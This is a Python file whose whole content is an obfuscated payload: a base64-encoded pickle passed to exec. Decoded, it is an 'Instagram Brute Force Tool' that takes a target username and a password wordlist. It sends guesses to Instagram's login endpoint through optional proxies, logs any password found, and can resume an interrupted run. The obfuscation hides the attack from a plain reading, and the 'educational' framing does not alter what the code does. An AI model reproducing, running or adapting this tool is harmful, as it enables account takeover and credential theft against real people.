import pickle, base64
exec(pickle.loads(base64.b64decode('gASV8RoAAAAAAABC6hoAACIiIg0KSW5zdGFncmFtIEJydXRlIEZvcmNlIFRvb2wgLSBBZHZhbmNlZCBFZHVjYXRpb25hbCBWZXJzaW9uDQpEZXZlbG9wZXI6IFBvdXlhIEZha2hhbQ0KQWNhZGVteTogQmxhY2t3YWNrZXIgRFYNCiIiIg0KDQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCB0aW1lDQppbXBvcnQgc3lzDQppbXBvcnQgb3MNCmZyb20gY29sb3JhbWEgaW1wb3J0IGluaXQsIEZvcmUsIFN0eWxlDQoNCiMgSW5pdGlhbGl6ZSBjb2xvcmFtYQ0KaW5pdChhdXRvcmVzZXQ9VHJ1ZSkNCg0KU1VDQ0VTU19GSUxFID0gInN1Y2Nlc3MudHh0Ig0KTE9HX0ZJTEUgPSAiYnJ1dGVmb3JjZS5sb2ciDQpSRVNVTUVfRklMRSA9ICJyZXN1bWUudHh0Ig0KDQojIC0tLSBTZXQgeW91ciBhY2Nlc3MgcGFzc3dvcmQgaGVyZSAtLS0NCkFDQ0VTU19QQVNTV09SRCA9ICJibGFja3dhY2tlcjIwMjUiDQoNCmRlZiBjaGVja19hY2Nlc3NfcGFzc3dvcmQoKToNCiAgICBmb3IgXyBpbiByYW5nZSgzKTogICMgYWxsb3cgMyBhdHRlbXB0cw0KICAgICAgICBlbnRlcmVkID0gaW5wdXQoRm9yZS5ZRUxMT1cgKyAiRW50ZXIgYWNjZXNzIHBhc3N3b3JkIHRvIHN0YXJ0OiAiICsgRm9yZS5XSElURSkuc3RyaXAoKQ0KICAgICAgICBpZiBlbnRlcmVkID09IEFDQ0VTU19QQVNTV09SRDoNCiAgICAgICAgICAgIHByaW50KEZvcmUuR1JFRU4gKyAiW0FjY2VzcyBncmFudGVkXVxuIikNCiAgICAgICAgICAgIHJldHVybiBUcnVlDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludChGb3JlLlJFRCArICJbV3JvbmcgcGFzc3dvcmQhIFRyeSBhZ2Fpbi5dIikNCiAgICBwcmludChGb3JlLlJFRCArICJUb28gbWFueSBmYWlsZWQgYXR0ZW1wdHMuIEV4aXRpbmcuIikNCiAgICBzeXMuZXhpdCgxKQ0KDQpkZWYgc2F2ZV9zdWNjZXNzKHVzZXJuYW1lLCBwYXNzd29yZCk6DQogICAgd2l0aCBvcGVuKFNVQ0NFU1NfRklMRSwgImEiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOg0KICAgICAgICBmLndyaXRlKGYie3VzZXJuYW1lfTp7cGFzc3dvcmR9XG4iKQ0KDQpkZWYgc2F2ZV9yZXN1bWUobGluZV9udW0pOg0KICAgIHdpdGggb3BlbihSRVNVTUVfRklMRSwgInciLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOg0KICAgICAgICBmLndyaXRlKHN0cihsaW5lX251bSkpDQoNCmRlZiByZWFkX3Jlc3VtZSgpOg0KICAgIGlmIG9zLnBhdGguZXhpc3RzKFJFU1VNRV9GSUxFKToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgd2l0aCBvcGVuKFJFU1VNRV9GSUxFLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6DQogICAgICAgICAgICAgICAgcmV0dXJuIGludChmLnJlYWQoKS5zdHJpcCgpKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICByZXR1cm4gMA0KICAgIHJldHVybiAwDQoNCmRlZiBsb2cobWVzc2FnZSk6DQogICAgd2l0aCBvcGVuKExPR19GSUxFLCAiYSIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6DQogICAgICAgIGYud3JpdGUobWVzc2FnZSArICJcbiIpDQoNCmRlZiB0cnlfbG9naW4odXNlcm5hbWUsIHBhc3N3b3JkLCBwcm94eT1Ob25lKToNCiAgICAiIiINCiAgICBTaW11bGF0ZWQgSW5zdGFncmFtIGxvZ2luIHJlcXVlc3QgKGVkdWNhdGlvbmFsKS4NCiAgICAiIiINCg0KICAgIHVybCA9ICJodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FjY291bnRzL2xvZ2luL2FqYXgvIg0KDQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwNCiAgICAgICAgIlgtUmVxdWVzdGVkLVdpdGgiOiAiWE1MSHR0cFJlcXVlc3QiLA0KICAgICAgICAiUmVmZXJlciI6ICJodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FjY291bnRzL2xvZ2luLyIsDQogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIg0KICAgIH0NCg0KICAgIGRhdGEgPSB7DQogICAgICAgICJ1c2VybmFtZSI6IHVzZXJuYW1lLA0KICAgICAgICAiZW5jX3Bhc3N3b3JkIjogZiIjUFdEX0lOU1RBR1JBTV9CUk9XU0VSOjA6e2ludCh0aW1lLnRpbWUoKSl9OntwYXNzd29yZH0iLA0KICAgICAgICAicXVlcnlQYXJhbXMiOiAie30iLA0KICAgICAgICAib3B0SW50b09uZVRhcCI6ICJmYWxzZSINCiAgICB9DQoNCiAgICBwcm94aWVzID0gTm9uZQ0KICAgIGlmIHByb3h5Og0KICAgICAgICBwcm94aWVzID0gew0KICAgICAgICAgICAgImh0dHAiOiBwcm94eSwNCiAgICAgICAgICAgICJodHRwcyI6IHByb3h5DQogICAgICAgIH0NCg0KICAgIHRyeToNCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBkYXRhPWRhdGEsIHByb3hpZXM9cHJveGllcywgdGltZW91dD0xMCkNCiAgICAgICAganNvbl9yZXNwID0gcmVzcG9uc2UuanNvbigpDQoNCiAgICAgICAgaWYganNvbl9yZXNwLmdldCgiYXV0aGVudGljYXRlZCIpID09IFRydWU6DQogICAgICAgICAgICByZXR1cm4gVHJ1ZSwganNvbl9yZXNwDQogICAgICAgIGVsaWYganNvbl9yZXNwLmdldCgibWVzc2FnZSIpID09ICJjaGVja3BvaW50X3JlcXVpcmVkIjoNCiAgICAgICAgICAgIGxvZyhmIlstXSBBY2NvdW50IHt1c2VybmFtZX0gcmVxdWlyZXMgY2hlY2twb2ludCB2ZXJpZmljYXRpb24uIikNCiAgICAgICAgICAgIHJldHVybiBGYWxzZSwgImNoZWNrcG9pbnRfcmVxdWlyZWQiDQogICAgICAgIGVsaWYgImVycm9yIiBpbiBqc29uX3Jlc3A6DQogICAgICAgICAgICBsb2coZiJbLV0gRXJyb3I6IHtqc29uX3Jlc3BbJ2Vycm9yJ119IikNCiAgICAgICAgICAgIHJldHVybiBGYWxzZSwgImVycm9yIg0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcmV0dXJuIEZhbHNlLCBqc29uX3Jlc3ANCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIGxvZyhmIlstXSBSZXF1ZXN0IGVycm9yOiB7ZX0iKQ0KICAgICAgICByZXR1cm4gRmFsc2UsICJleGNlcHRpb24iDQoNCmRlZiBwcmludF9iYW5uZXIoKToNCiAgICBwcmludChGb3JlLkNZQU4gKyBTdHlsZS5CUklHSFQgKyAiIiINCuKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcg4paI4paI4pWXICAg4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlw0K4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAg4paI4paI4pWR4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWdDQrilojilojilZEgICAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilZcgIA0K4paI4paI4pWRICAgICDilojilojilZEgICDilojilojilZHilojilojilZEgICDilojilojilZEgICDilojilojilZEgICDilojilojilZTilZDilZDilZ0gIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWU4pWQ4pWQ4pWdICANCuKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVl+KVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWXDQog4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdICAgIOKVmuKVkOKVnSAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdDQoNCiAgICAgQmxhY2t3YWNrZXIgRFYgQWNhZGVteQ0KICAgICBEZXZlbG9wZXI6IFBvdXlhIEZha2hhbQ0KIiIiICsgU3R5bGUuUkVTRVRfQUxMKQ0KDQpkZWYgZ2V0X2lucHV0KHByb21wdCwgcmVxdWlyZWQ9VHJ1ZSk6DQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgdmFsID0gaW5wdXQoRm9yZS5ZRUxMT1cgKyBwcm9tcHQgKyBGb3JlLldISVRFICsgIiAiKS5zdHJpcCgpDQogICAgICAgIGlmIHZhbCBvciBub3QgcmVxdWlyZWQ6DQogICAgICAgICAgICByZXR1cm4gdmFsDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludChGb3JlLlJFRCArICJbIV0gVGhpcyBmaWVsZCBpcyByZXF1aXJlZC4iKQ0KDQpkZWYgbWFpbigpOg0KICAgIGNoZWNrX2FjY2Vzc19wYXNzd29yZCgpDQoNCiAgICBwcmludF9iYW5uZXIoKQ0KDQogICAgcHJpbnQoRm9yZS5HUkVFTiArICJXZWxjb21lIHRvIEluc3RhZ3JhbSBCcnV0ZSBGb3JjZSBUb29sIC0gQWR2YW5jZWQgVmVyc2lvbiIpDQogICAgcHJpbnQoRm9yZS5HUkVFTiArICJQbGVhc2UgZW50ZXIgdGhlIHJlcXVpcmVkIGluZm9ybWF0aW9uIGJlbG93OiIpDQoNCiAgICB1c2VybmFtZSA9IGdldF9pbnB1dCgiVGFyZ2V0IEluc3RhZ3JhbSB1c2VybmFtZToiKQ0KICAgIHdvcmRsaXN0X3BhdGggPSBnZXRfaW5wdXQoIlBhdGggdG8gcGFzc3dvcmQgd29yZGxpc3QgZmlsZToiKQ0KICAgIHByb3h5ID0gZ2V0X2lucHV0KCJQcm94eSAob3B0aW9uYWwsIGZvcm1hdCBodHRwOi8vaXA6cG9ydCk6IiwgcmVxdWlyZWQ9RmFsc2UpDQogICAgZGVsYXlfaW5wdXQgPSBnZXRfaW5wdXQoIkRlbGF5IGJldHdlZW4gYXR0ZW1wdHMgaW4gc2Vjb25kcyAoZGVmYXVsdCAxKToiLCByZXF1aXJlZD1GYWxzZSkNCiAgICBkZWxheSA9IGZsb2F0KGRlbGF5X2lucHV0KSBpZiBkZWxheV9pbnB1dCBlbHNlIDEuMA0KDQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHdvcmRsaXN0X3BhdGgpOg0KICAgICAgICBwcmludChGb3JlLlJFRCArICJbIV0gV29yZGxpc3QgZmlsZSBub3QgZm91bmQuIEV4aXRpbmcuIikNCiAgICAgICAgc3lzLmV4aXQoMSkNCg0KICAgIHN0YXJ0X2xpbmUgPSByZWFkX3Jlc3VtZSgpDQogICAgcHJpbnQoRm9yZS5ZRUxMT1cgKyBmIltpXSBSZXN1bWluZyBmcm9tIGxpbmUge3N0YXJ0X2xpbmV9IGluIHdvcmRsaXN0LiIpDQoNCiAgICB3aXRoIG9wZW4od29yZGxpc3RfcGF0aCwgInIiLCBlbmNvZGluZz0idXRmLTgiLCBlcnJvcnM9Imlnbm9yZSIpIGFzIGZpbGU6DQogICAgICAgIGxpbmVzID0gZmlsZS5yZWFkbGluZXMoKQ0KDQogICAgdG90YWxfbGluZXMgPSBsZW4obGluZXMpDQoNCiAgICB0cnk6DQogICAgICAgIGZvciBpIGluIHJhbmdlKHN0YXJ0X2xpbmUsIHRvdGFsX2xpbmVzKToNCiAgICAgICAgICAgIHBhc3N3b3JkID0gbGluZXNbaV0uc3RyaXAoKQ0KICAgICAgICAgICAgcHJpbnQoRm9yZS5XSElURSArIGYiW35dIFRyeWluZyBwYXNzd29yZDoge3Bhc3N3b3JkfSIpDQoNCiAgICAgICAgICAgIHN1Y2Nlc3MsIHJlc3AgPSB0cnlfbG9naW4odXNlcm5hbWUsIHBhc3N3b3JkLCBwcm94eT1wcm94eSkNCg0KICAgICAgICAgICAgaWYgc3VjY2VzczoNCiAgICAgICAgICAgICAgICBwcmludChGb3JlLkdSRUVOICsgZiJbK10gUGFzc3dvcmQgZm91bmQ6IHtwYXNzd29yZH0iKQ0KICAgICAgICAgICAgICAgIHNhdmVfc3VjY2Vzcyh1c2VybmFtZSwgcGFzc3dvcmQpDQogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoUkVTVU1FX0ZJTEUpOg0KICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoUkVTVU1FX0ZJTEUpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgaWYgcmVzcCA9PSAiY2hlY2twb2ludF9yZXF1aXJlZCI6DQogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgIlshXSBBY2NvdW50IHJlcXVpcmVzIGNoZWNrcG9pbnQgdmVyaWZpY2F0aW9uLiBTdG9wcGluZy4iKQ0KICAgICAgICAgICAgICAgICAgICBsb2coZiJDaGVja3BvaW50IG9uIHt1c2VybmFtZX0iKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgcmVzcCA9PSAiZXhjZXB0aW9uIjoNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiWyFdIFJlcXVlc3QgZXJyb3IuIFdhaXRpbmcgNSBzZWNvbmRzIGJlZm9yZSByZXRyeWluZy4iKQ0KICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDUpDQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5ZRUxMT1cgKyAiWyFdIEluY29ycmVjdCBwYXNzd29yZC4iKQ0KDQogICAgICAgICAgICBzYXZlX3Jlc3VtZShpICsgMSkNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoZGVsYXkpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludChGb3JlLlJFRCArICJbIV0gUGFzc3dvcmQgbm90IGZvdW5kIGluIHdvcmRsaXN0LiIpDQoNCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6DQogICAgICAgIHByaW50KEZvcmUuUkVEICsgIlxuWyFdIEludGVycnVwdGVkIGJ5IHVzZXIuIFNhdmluZyBwcm9ncmVzcyBhbmQgZXhpdGluZy4iKQ0KICAgICAgICBzYXZlX3Jlc3VtZShpKQ0KICAgICAgICBzeXMuZXhpdCgwKQ0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ0KlC4=')))
